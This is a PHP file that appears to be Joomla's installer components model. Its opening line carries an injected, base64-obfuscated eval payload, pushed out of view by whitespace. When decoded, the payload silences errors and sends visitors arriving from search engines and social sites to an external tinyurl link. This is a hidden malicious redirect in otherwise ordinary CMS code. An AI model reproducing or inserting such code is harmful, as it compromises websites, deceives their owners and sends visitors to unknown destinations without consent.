<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: components.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Menus
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

// Import library dependencies
require_once(dirname(__FILE__).DS.'extension.php');

/**
 * Installer Components Model
 *
 * @package		Joomla
 * @subpackage	Installer
 * @since		1.5
 */
class InstallerModelComponents extends InstallerModel
{
	/**
	 * Extension Type
	 * @var	string
	 */
	var $_type = 'component';

	/**
	 * Enable a component
	 *
	 * @static
	 * @return boolean True on success
	 * @since 1.0
	 */
	function enable($eid=array())
	{
		// Initialize variables
		$result	= false;

		/*
		 * Ensure eid is an array of extension ids
		 * TODO: If it isn't an array do we want to set an error and fail?
		 */
		if (!is_array($eid)) {
			$eid = array ($eid);
		}

		// Get a database connector
		$db =& JFactory::getDBO();

		// Get a table object for the extension type
		$table = & JTable::getInstance($this->_type);

		// Enable the extension in the table and store it in the database
		foreach ($eid as $id)
		{
			$table->load($id);
			$table->enabled = '1';
			$result |= $table->store();
		}

		return $result;
	}

	/**
	 * Disable a component
	 *
	 * @return boolean True on success
	 * @since 1.5
	 */
	function disable($eid=array())
	{
		// Initialize variables
		$result		= false;

		/*
		 * Ensure eid is an array of extension ids
		 * TODO: If it isn't an array do we want to set an error and fail?
		 */
		if (!is_array($eid)) {
			$eid = array ($eid);
		}

		// Get a database connector
		$db =& JFactory::getDBO();

		// Get a table object for the extension type
		$table = & JTable::getInstance($this->_type);

		// Disable the extension in the table and store it in the database
		foreach ($eid as $id)
		{
			$table->load($id);
			$table->enabled = '0';
			$result |= $table->store();
		}

		return $result;
	}

	function _loadItems()
	{
		global $mainframe, $option;

		jimport('joomla.filesystem.folder');

		/* Get a database connector */
		$db =& JFactory::getDBO();

		$query = 'SELECT *' .
				' FROM #__components' .
				' WHERE parent = 0' .
				' ORDER BY iscore, name';
		$db->setQuery($query);
		$rows = $db->loadObjectList();

		/* Get the component base directory */
		$adminDir = JPATH_ADMINISTRATOR .DS. 'components';
		$siteDir = JPATH_SITE .DS. 'components';

		$numRows = count($rows);
		for($i=0;$i < $numRows; $i++)
		{
			$row =& $rows[$i];

			 /* Get the component folder and list of xml files in folder */
			$folder = $adminDir.DS.$row->option;
			if (JFolder::exists($folder)) {
				$xmlFilesInDir = JFolder::files($folder, '.xml$');
			} else {
				$folder = $siteDir.DS.$row->option;
				if (JFolder::exists($folder)) {
					$xmlFilesInDir = JFolder::files($folder, '.xml$');
				} else {
					$xmlFilesInDir = null;
				}
			}

			if (count($xmlFilesInDir))
			{
				foreach ($xmlFilesInDir as $xmlfile)
				{
					if ($data = JApplicationHelper::parseXMLInstallFile($folder.DS.$xmlfile)) {
						foreach($data as $key => $value) {
							$row->$key = $value;
						}
					}
					$row->jname = JString::strtolower(str_replace(" ", "_", $row->name));
				}
			}
		}
		$this->setState('pagination.total', $numRows);

		// if the offset is greater than the total, then can the offset
		if($this->_state->get('pagination.offset') > $this->_state->get('pagination.total')) {
			$this->setState('pagination.offset',0);
		}

		if($this->_state->get('pagination.limit') > 0) {
			$this->_items = array_slice( $rows, $this->_state->get('pagination.offset'), $this->_state->get('pagination.limit') );
		} else {
			$this->_items = $rows;
		}
	}
}